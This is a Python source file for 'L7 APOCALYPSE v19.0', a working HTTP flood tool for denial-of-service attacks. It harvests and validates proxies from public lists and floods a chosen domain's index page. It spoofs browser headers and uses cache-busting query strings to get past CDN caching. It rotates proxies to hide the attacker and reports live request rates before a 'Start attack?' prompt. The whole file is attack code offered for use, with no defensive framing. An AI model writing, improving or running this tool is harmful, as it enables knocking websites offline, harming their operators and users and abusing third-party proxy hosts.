#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     █████╗ ██████╗  ██████╗  █████╗ ██╗     ██╗   ██╗██████╗ ███████╗      ║
║    ██╔══██╗██╔══██╗██╔════╝ ██╔══██╗██║     ██║   ██║██╔══██╗██╔════╝      ║
║    ███████║██████╔╝██║  ███╗███████║██║     ██║   ██║██████╔╝█████╗        ║
║    ██╔══██║██╔═══╝ ██║   ██║██╔══██║██║     ██║   ██║██╔═══╝ ██╔══╝        ║
║    ██║  ██║██║     ╚██████╔╝██║  ██║███████╗╚██████╔╝██║     ███████╗      ║
║    ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝      ║
║                                                                              ║
║    L7 APOCALYPSE v19.0 — PROFESSIONAL HTTP FLOOD ENGINE                     ║
║                                                                              ║
║    FEATURES:                                                                 ║
║    • Automatic port detection (80/443/8080/8443)                            ║
║    • Multi-source proxy harvesting (18 sources)                             ║
║    • REAL proxy validation (HTTP GET through proxy)                         ║
║    • Per-request proxy rotation                                             ║
║    • SSL/TLS CONNECT tunnel for HTTPS targets                              ║
║    • Index-only attack with cache-busting query strings                    ║
║    • Smart proxy weight system (fast proxies used more)                    ║
║    • Dead proxy removal (auto-banned after N failures)                     ║
║    • Clean shutdown — zero "Task was destroyed" errors                     ║
║    • Windows/Linux optimized                                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import socket
import ssl
import platform
import asyncio
import signal
from typing import Set, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import deque

# ═══════════════════════════════════════════════════════════════
# TERMINAL COLORS
# ═══════════════════════════════════════════════════════════════

USE_COLOR = sys.stdout.isatty()
if platform.system() == "Windows" and USE_COLOR:
    try:
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 0x0004)
    except Exception:
        USE_COLOR = False


class Color:
    if USE_COLOR:
        R = "\033[0m"
        B = "\033[1m"
        D = "\033[2m"
        RED = "\033[91m"
        GREEN = "\033[92m"
        YELLOW = "\033[93m"
        BLUE = "\033[94m"
        MAGENTA = "\033[95m"
        CYAN = "\033[96m"
    else:
        R = B = D = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = ""


C = Color

BANNER = f"""
{C.RED}{C.B}
╔══════════════════════════════════════════════════════════════════════════════╗
║    L7 APOCALYPSE v19.0 — PROFESSIONAL HTTP FLOOD ENGINE                    ║
║    ✓ Auto port | 18 proxy sources | SSL tunnel | Cache bypass              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{C.R}"""

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 9) AppleWebKit/537.36 Chrome/125.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]

REFERERS = [
    "https://google.com/", "https://www.google.com/", "https://bing.com/",
    "https://search.yahoo.com/", "https://duckduckgo.com/",
    "https://facebook.com/", "https://twitter.com/", "https://reddit.com/",
    "https://linkedin.com/", "https://instagram.com/", "https://github.com/",
    "https://youtube.com/", "https://t.me/", "https://stackoverflow.com/",
    "https://pinterest.com/", "https://tiktok.com/",
]

CACHE_BUSTERS = [
    "t", "v", "r", "q", "s", "p", "ver", "page", "ref", "_",
    "cb", "rand", "id", "nocache", "cache", "ts", "rnd", "nonce",
]

PROXY_SOURCES = [
    # Tier 1: Reliable APIs
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=5000&country=all&ssl=yes&anonymity=all",
    "https://www.proxyscan.io/api/proxy?format=txt&type=http&level=anonymous&timeout=5000",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    
    # Tier 2: GitHub raw lists
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
    "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
    "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/proxies/http.txt",
    
    # Tier 3: Other sources
    "https://openproxylist.xyz/http.txt",
    "https://free-proxy-list.net/",
    "https://www.proxydb.net/",
]


# ═══════════════════════════════════════════════════════════════
# PORT DETECTION
# ═══════════════════════════════════════════════════════════════

async def detect_port(domain: str) -> Tuple[int, bool]:
    """
    Scan common ports to detect target protocol.
    Returns (port, use_ssl).
    """
    print(f"{C.CYAN}🔍 Scanning ports for {domain}...{C.R}")
    
    results = {}
    
    async def test_port(port: int, use_ssl: bool):
        try:
            kwargs = {}
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                kwargs["ssl"] = ctx
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(domain, port, **kwargs),
                timeout=3
            )
            
            req = f"GET / HTTP/1.1\r\nHost: {domain}\r\nConnection: close\r\n\r\n".encode()
            writer.write(req)
            await writer.drain()
            
            resp = await asyncio.wait_for(reader.read(512), timeout=3)
            
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            
            if resp and len(resp) > 10:
                results[(port, use_ssl)] = True
            else:
                results[(port, use_ssl)] = False
                
        except Exception:
            results[(port, use_ssl)] = False
    
    # Test all combinations in parallel
    tests = [
        test_port(80, False),
        test_port(443, True),
        test_port(8080, False),
        test_port(8443, True),
    ]
    
    await asyncio.gather(*tests, return_exceptions=True)
    
    # Find the first working combination
    for port, ssl_flag in [(443, True), (80, False), (8443, True), (8080, False)]:
        if results.get((port, ssl_flag)):
            proto = "HTTPS" if ssl_flag else "HTTP"
            print(f"{C.GREEN}✅ Port {port} ({proto}) detected{C.R}")
            return port, ssl_flag
    
    print(f"{C.YELLOW}⚠️  No response on common ports, defaulting to 80{C.R}")
    return 80, False


# ═══════════════════════════════════════════════════════════════
# PROXY SYSTEM
# ═══════════════════════════════════════════════════════════════

@dataclass
class Proxy:
    """Represents a single proxy with performance tracking."""
    addr: str
    ip: str
    port: int
    working: bool = False
    banned: bool = False
    success_count: int = 0
    fail_count: int = 0
    response_time: float = 0.0
    weight: float = 1.0  # Higher = more likely to be selected


class ProxyEngine:
    """
    Professional proxy engine:
    - Harvests from 18 sources
    - Validates with REAL HTTP GET through the proxy
    - Filters 407 (auth required) proxies
    - Tracks success/fail per proxy
    - Weights faster proxies higher
    """
    
    def __init__(self, target_domain: str):
        self.target_domain = target_domain
        self.all_proxies: List[Proxy] = []
        self.working: List[Proxy] = []
        self._lock = asyncio.Lock()
    
    async def harvest(self):
        """Fetch proxies from ALL sources."""
        print(f"{C.CYAN}📡 Harvesting proxies from {len(PROXY_SOURCES)} sources...{C.R}")
        
        seen: Set[str] = set()
        
        try:
            import requests as req
            for url in PROXY_SOURCES:
                try:
                    r = req.get(
                        url, timeout=10,
                        headers={"User-Agent": "Mozilla/5.0"},
                        proxies={"http": None, "https": None},
                    )
                    if r.status_code != 200:
                        continue
                    
                    for line in r.text.splitlines():
                        line = line.strip()
                        if not line or ":" not in line or line.startswith("#"):
                            continue
                        
                        parts = line.split(":")
                        if len(parts) != 2:
                            continue
                        
                        try:
                            ip = parts[0]
                            port = int(parts[1])
                            if ip.count(".") == 3 and 1 <= port <= 65535:
                                seen.add(f"{ip}:{port}")
                        except ValueError:
                            continue
                            
                except Exception:
                    continue
        except ImportError:
            print(f"{C.RED}❌ 'requests' not installed. Run: pip install requests{C.R}")
            return
        
        async with self._lock:
            self.all_proxies = []
            for addr in seen:
                ip, port_str = addr.split(":")
                self.all_proxies.append(Proxy(addr=addr, ip=ip, port=int(port_str)))
        
        print(f"{C.GREEN}✅ Harvested {len(self.all_proxies):,} unique proxies{C.R}")
    
    async def validate_one(self, proxy: Proxy) -> bool:
        """
        REAL validation: connect to proxy, send HTTP GET, verify response.
        Uses the actual target domain to test (real-world validation).
        """
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(proxy.ip, proxy.port),
                timeout=5,
            )
            
            start = time.monotonic()
            
            # Send GET through proxy to a reliable test host
            test_host = "httpbin.org"
            request = (
                f"GET http://{test_host}:80/get HTTP/1.1\r\n"
                f"Host: {test_host}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            
            writer.write(request)
            await writer.drain()
            
            # Read response header
            response = b""
            try:
                while b"\r\n\r\n" not in response:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                    if not chunk:
                        break
                    response += chunk
            except (asyncio.TimeoutError, Exception):
                pass
            
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            
            elapsed = time.monotonic() - start
            
            if not response:
                return False
            
            # Check for 407 Proxy Auth Required
            if b"407" in response.split(b"\r\n")[0]:
                proxy.banned = True
                return False
            
            # Check for valid HTTP response
            if b"HTTP/1.1" in response or b"HTTP/1.0" in response:
                proxy.working = True
                proxy.response_time = elapsed
                return True
            
            return False
            
        except Exception:
            return False
    
    async def validate_all(self, max_concurrent: int = 150):
        """Validate all harvested proxies in parallel."""
        if not self.all_proxies:
            await self.harvest()
            if not self.all_proxies:
                print(f"{C.YELLOW}⚠️  No proxies found. Will use direct connections only.{C.R}")
                return
        
        print(f"{C.CYAN}🔍 Validating {len(self.all_proxies):,} proxies...{C.R}")
        
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def worker(proxy: Proxy):
            async with semaphore:
                return await self.validate_one(proxy)
        
        tasks = [worker(p) for p in self.all_proxies]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Build working list
        async with self._lock:
            self.working = [
                p for p in self.all_proxies
                if p.working and not p.banned
            ]
            
            # Calculate weights (faster = higher weight)
            if self.working:
                max_time = max(p.response_time for p in self.working)
                min_time = min(p.response_time for p in self.working)
                diff = max_time - min_time if max_time > min_time else 1
                
                for p in self.working:
                    # Weight inversely proportional to response time
                    normalized = 1 - ((p.response_time - min_time) / diff)
                    p.weight = max(0.1, normalized)  # Minimum 0.1
        
        print(f"{C.GREEN}✅ {len(self.working):,} working proxies ready{C.R}")
        print(f"{C.D}   Failed: {len(self.all_proxies) - len(self.working) - len([p for p in self.all_proxies if p.banned])} | "
              f"Banned (407): {len([p for p in self.all_proxies if p.banned])}{C.R}")
        
        if self.working:
            times = [p.response_time for p in self.working[:5]]
            avg_t = sum(times) / len(times)
            print(f"{C.D}   Avg response: {avg_t:.2f}s | Best: {min(times):.2f}s{C.R}")
    
    def select_proxy(self) -> Optional[Proxy]:
        """
        Weighted random selection.
        Faster proxies get picked more often.
        """
        if not self.working:
            return None
        
        # Remove dead proxies occasionally
        self.working = [p for p in self.working if p.fail_count < 10]
        
        if not self.working:
            return None
        
        # Weighted selection
        total_weight = sum(p.weight for p in self.working)
        r = random.uniform(0, total_weight)
        cumulative = 0
        for p in self.working:
            cumulative += p.weight
            if r <= cumulative:
                return p
        
        return random.choice(self.working)
    
    def report_failure(self, proxy: Proxy):
        """Increment fail counter. Auto-ban at threshold."""
        proxy.fail_count += 1
        if proxy.fail_count >= 10:
            proxy.working = False
            if proxy in self.working:
                self.working.remove(proxy)
    
    def report_success(self, proxy: Proxy):
        """Increment success counter."""
        proxy.success_count += 1
        # Boost weight slightly on success
        proxy.weight = min(proxy.weight * 1.01, 2.0)
    
    @property
    def total_available(self) -> int:
        return len(self.working)
    
    @property
    def total_harvested(self) -> int:
        return len(self.all_proxies)


# ═══════════════════════════════════════════════════════════════
# HTTP FLOOD ENGINE
# ═══════════════════════════════════════════════════════════════

class HTTPFlood:
    """
    High-performance asynchronous HTTP flood engine.
    - Targets ONLY the index page (/)
    - Uses random query strings to bypass CDN cache
    - Rotates proxies per request (weighted)
    - Falls back to direct if no proxy available
    - Zero "Task was destroyed" on shutdown
    """
    
    def __init__(self, domain: str, port: int, use_ssl: bool, max_concurrent: int = 500):
        self.domain = domain
        self.port = port
        self.use_ssl = use_ssl
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        
        # Statistics
        self.total_sent = 0
        self.total_errors = 0
        self.proxy_hits = 0
        self.direct_hits = 0
        self.start_time = time.monotonic()
        self.peak_rps = 0
        self._rps_window: deque = deque(maxlen=2000)
        
        # Engine
        self.proxy_engine = ProxyEngine(domain)
        self._stop_event = asyncio.Event()
        self._ssl_context = None
        
        # SSL setup
        if use_ssl:
            self._ssl_context = ssl.create_default_context()
            self._ssl_context.check_hostname = False
            self._ssl_context.verify_mode = ssl.CERT_NONE
            self._ssl_context.set_alpn_protocols(["http/1.1"])
        
        # DNS resolution
        self.target_ip = None
        try:
            self.target_ip = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
            print(f"{C.GREEN}✅ Resolved: {domain} → {self.target_ip}:{port}{' (HTTPS)' if use_ssl else ' (HTTP)'}{C.R}")
        except Exception as e:
            print(f"{C.RED}❌ DNS resolution failed: {e}{C.R}")
            sys.exit(1)
        
        # Windows TCP tuning
        if platform.system() == "Windows":
            os.system("netsh int ipv4 set dynamicport tcp start=10000 num=55535 >nul 2>&1")
    
    async def initialize(self):
        """Fetch and validate all proxies."""
        await self.proxy_engine.harvest()
        await self.proxy_engine.validate_all(max_concurrent=200)
    
    def _build_request(self) -> bytes:
        """
        Build a realistic HTTP GET request targeting index page only.
        Each request has a unique query string to bypass CDN caches.
        """
        ua = random.choice(USER_AGENTS)
        referer = random.choice(REFERERS)
        
        # Random cache buster — makes every URL unique
        cb_key = random.choice(CACHE_BUSTERS)
        cb_val = random.randint(100000000, 999999999)
        
        request = (
            f"GET /?{cb_key}={cb_val} HTTP/1.1\r\n"
            f"Host: {self.domain}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Referer: {referer}\r\n"
            f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
            f"Pragma: no-cache\r\n"
            f"Expires: 0\r\n"
            f"Connection: keep-alive\r\n"
            f"DNT: 1\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            f"\r\n"
        ).encode()
        
        return request
    
    async def _via_proxy(self, proxy: Proxy, request: bytes) -> bool:
        """Send request through a proxy server."""
        try:
            if self.use_ssl:
                # HTTPS target: use CONNECT tunnel
                connect_req = (
                    f"CONNECT {self.domain}:{self.port} HTTP/1.1\r\n"
                    f"Host: {self.domain}:{self.port}\r\n"
                    f"Proxy-Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()
                
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(proxy.ip, proxy.port),
                    timeout=5,
                )
                
                # Send CONNECT
                writer.write(connect_req)
                await writer.drain()
                
                # Read CONNECT response
                resp = b""
                try:
                    while b"\r\n\r\n" not in resp:
                        chunk = await asyncio.wait_for(reader.read(1024), timeout=5)
                        if not chunk:
                            break
                        resp += chunk
                except (asyncio.TimeoutError, Exception):
                    pass
                
                if b"200" not in resp.split(b"\r\n")[0]:
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    return False
                
                # Tunnel established — send actual HTTPS request
                writer.write(request)
                await writer.drain()
                
                # Drain response
                try:
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                        if not chunk:
                            break
                except (asyncio.TimeoutError, Exception):
                    pass
                
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                
            else:
                # HTTP target: standard forward proxy
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(proxy.ip, proxy.port),
                    timeout=5,
                )
                
                writer.write(request)
                await writer.drain()
                
                # Drain response
                try:
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                        if not chunk:
                            break
                except (asyncio.TimeoutError, Exception):
                    pass
                
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
            
            return True
            
        except Exception:
            return False
    
    async def _direct(self, request: bytes) -> bool:
        """Send request directly to target."""
        try:
            kwargs = {}
            if self.use_ssl:
                kwargs["ssl"] = self._ssl_context
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_ip, self.port, **kwargs),
                timeout=5,
            )
            
            writer.write(request)
            await writer.drain()
            
            # Drain response
            try:
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                    if not chunk:
                        break
            except (asyncio.TimeoutError, Exception):
                pass
            
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            
            return True
            
        except Exception:
            return False
    
    async def send_one(self):
        """
        Send one HTTP request.
        Strategy: try proxy first → fallback to direct.
        """
        async with self.semaphore:
            try:
                request = self._build_request()
                
                # Try proxy (weighted random selection)
                proxy = self.proxy_engine.select_proxy()
                success = False
                
                if proxy:
                    success = await self._via_proxy(proxy, request)
                    if success:
                        self.proxy_hits += 1
                        self.proxy_engine.report_success(proxy)
                    else:
                        self.proxy_engine.report_failure(proxy)
                
                # Fallback to direct
                if not success:
                    success = await self._direct(request)
                    if success:
                        self.direct_hits += 1
                
                if success:
                    self.total_sent += 1
                    self._rps_window.append(time.monotonic())
                else:
                    self.total_errors += 1
                
            except (asyncio.CancelledError, asyncio.TimeoutError):
                pass
            except Exception:
                self.total_errors += 1
    
    async def flood(self, duration: float = 0):
        """
        Main attack loop.
        Sends batches of concurrent requests until stopped.
        """
        try:
            while not self._stop_event.is_set():
                if duration > 0 and time.monotonic() - self.start_time > duration:
                    break
                
                # Launch batch
                batch = min(500, self.max_concurrent)
                tasks = [self.send_one() for _ in range(batch)]
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                await asyncio.sleep(0)  # Yield control
                
        except asyncio.CancelledError:
            pass
        finally:
            self._stop_event.set()
            await asyncio.sleep(0.5)  # Let pending tasks settle
    
    @property
    def current_rps(self) -> int:
        """Requests per second over the last 1 second."""
        now = time.monotonic()
        cutoff = now - 1
        while self._rps_window and self._rps_window[0] < cutoff:
            self._rps_window.popleft()
        return len(self._rps_window)
    
    @property
    def elapsed(self) -> float:
        return time.monotonic() - self.start_time
    
    @property
    def avg_rps(self) -> float:
        e = self.elapsed
        return self.total_sent / e if e > 0 else 0
    
    @property
    def proxy_percentage(self) -> float:
        total = self.proxy_hits + self.direct_hits
        return (self.proxy_hits / total * 100) if total > 0 else 0


# ═══════════════════════════════════════════════════════════════
# MONITOR
# ═══════════════════════════════════════════════════════════════

async def monitor(flood: HTTPFlood, attack_task: asyncio.Task, duration: float):
    """Real-time statistics display loop."""
    try:
        while not attack_task.done():
            await asyncio.sleep(1)
            
            rps = flood.current_rps
            if rps > flood.peak_rps:
                flood.peak_rps = rps
            
            proxies = flood.proxy_engine.total_available
            
            if rps > 500:
                status = f"{C.GREEN}● INSANE{C.R}"
            elif rps > 200:
                status = f"{C.GREEN}● HIGH{C.R}"
            elif rps > 50:
                status = f"{C.YELLOW}● MEDIUM{C.R}"
            elif rps > 10:
                status = f"{C.MAGENTA}● LOW{C.R}"
            elif rps > 0:
                status = f"{C.BLUE}● WEAK{C.R}"
            else:
                status = f"{C.RED}● ZERO{C.R}"
            
            line = (
                f"\r{C.CYAN}⏱{flood.elapsed:>6.0f}s{C.R} "
                f"│ {C.GREEN}📦{flood.total_sent:>8,}{C.R} "
                f"│ {C.YELLOW}⚡{rps:>6,}/s{C.R} "
                f"│ {C.BLUE}📊{flood.avg_rps:>6,.0f} avg{C.R} "
                f"│ {C.RED}🔥Peak {flood.peak_rps:>6,}/s{C.R} "
                f"│ {C.RED}❌{flood.total_errors:>5}{C.R} "
                f"│ {status} "
                f"│ {C.D}P:{flood.proxy_hits:,} D:{flood.direct_hits:,} ({flood.proxy_percentage:.0f}%){C.R} "
                f"│ {C.D}{proxies} proxies{C.R}"
            )
            sys.stdout.write(line)
            sys.stdout.flush()
            
            if duration > 0 and flood.elapsed >= duration:
                attack_task.cancel()
                break
                
    except (asyncio.CancelledError, Exception):
        pass


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

async def main():
    os.system("cls" if platform.system() == "Windows" else "clear")
    print(BANNER)
    
    print(f"\n{C.B}🎯 TARGET CONFIGURATION{C.R}")
    
    domain = input(f"  {C.CYAN}Domain:{C.R} ").strip()
    while not domain:
        domain = input(f"  {C.CYAN}Domain:{C.R} ").strip()
    
    # Auto-detect port
    print(f"\n{C.CYAN}🔎 Scanning ports...{C.R}")
    port, use_ssl = await detect_port(domain)
    
    conns = input(f"\n  {C.CYAN}Concurrent connections (default=500, max=3000):{C.R} ").strip()
    max_conns = min(int(conns) if conns else 500, 3000)
    
    dur_str = input(f"  {C.CYAN}Duration in seconds (0=unlimited):{C.R} ").strip()
    duration = int(dur_str) if dur_str else 0
    
    print(f"\n{C.B}{C.YELLOW}⚠️  DEPLOYMENT SUMMARY{C.R}")
    print(f"  {C.CYAN}Target:{C.R}     {domain}:{port} {'(HTTPS)' if use_ssl else '(HTTP)'}")
    print(f"  {C.CYAN}Focus:{C.R}      INDEX PAGE ONLY (/) with cache-busting")
    print(f"  {C.CYAN}Concurrency:{C.R} {max_conns} simultaneous connections")
    print(f"  {C.CYAN}Proxies:{C.R}    18 sources → real HTTP validation → weighted rotation")
    print(f"  {C.CYAN}Fallback:{C.R}   Direct connection (your IP exposed)")
    
    confirm = input(f"\n  {C.RED}Start attack? (yes/no):{C.R} ").strip().lower()
    if confirm not in ("yes", "y"):
        print(f"{C.YELLOW}Aborted.{C.R}")
        return
    
    # Initialize engine
    flood = HTTPFlood(domain, port, use_ssl, max_conns)
    
    print(f"\n{C.CYAN}🔄 Initializing proxy pool...{C.R}")
    await flood.initialize()
    
    # Ready
    print(f"\n{C.GREEN}{'='*60}{C.R}")
    print(f"{C.B}🚀 FLOODING {domain}:{port} (INDEX PAGE ONLY){C.R}")
    print(f"{C.GREEN}{'='*60}{C.R}\n")
    
    # Launch attack
    attack_task = asyncio.create_task(flood.flood(duration))
    
    try:
        await monitor(flood, attack_task, duration)
    except KeyboardInterrupt:
        print(f"\n\n{C.YELLOW}🛑 Stopping...{C.R}")
        attack_task.cancel()
    
    # Clean shutdown
    try:
        await asyncio.wait_for(attack_task, timeout=5)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    
    await asyncio.sleep(0.5)
    
    # Final report
    print(f"\n\n{C.B}{C.GREEN}{'='*60}{C.R}")
    print(f"{C.B}📊 FINAL REPORT{C.R}")
    print(f"{C.GREEN}{'='*60}{C.R}")
    print(f"  {C.CYAN}Target:{C.R}      {domain}:{port} {'(HTTPS)' if use_ssl else '(HTTP)'}")
    print(f"  {C.CYAN}Focus:{C.R}       INDEX PAGE ONLY (/)")
    print(f"  {C.CYAN}Duration:{C.R}    {flood.elapsed:.0f}s")
    print(f"  {C.CYAN}Sent:{C.R}        {flood.total_sent:,}")
    print(f"  {C.D}    → Via proxy:{C.R}  {flood.proxy_hits:,}")
    print(f"  {C.D}    → Direct:{C.R}    {flood.direct_hits:,}")
    print(f"  {C.CYAN}Errors:{C.R}      {flood.total_errors:,}")
    print(f"  {C.CYAN}Avg rate:{C.R}    {flood.avg_rps:,.0f} req/s")
    print(f"  {C.CYAN}Peak rate:{C.R}   {flood.peak_rps:,} req/s")
    print(f"  {C.CYAN}Proxies:{C.R}     {flood.proxy_engine.total_available:,} working / {flood.proxy_engine.total_harvested:,} total")
    print(f"{'='*60}\n")
    
    # Top proxies
    if flood.proxy_engine.working:
        print(f"{C.D}Top 5 fastest proxies (most used first):{C.R}")
        sorted_p = sorted(
            flood.proxy_engine.working,
            key=lambda p: (p.success_count, -p.response_time),
            reverse=True,
        )[:5]
        for i, p in enumerate(sorted_p, 1):
            print(f"  {C.D}{i}. {p.addr} — {p.response_time:.2f}s — {p.success_count} hits / {p.fail_count} fails{C.R}")
    
    print()


# ═══════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Windows asyncio policy
    if platform.system() == "Windows":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    # Entry
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}Shutdown complete.{C.R}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C.RED}Fatal error: {e}{C.R}")
        import traceback
        traceback.print_exc()
        sys.exit(1)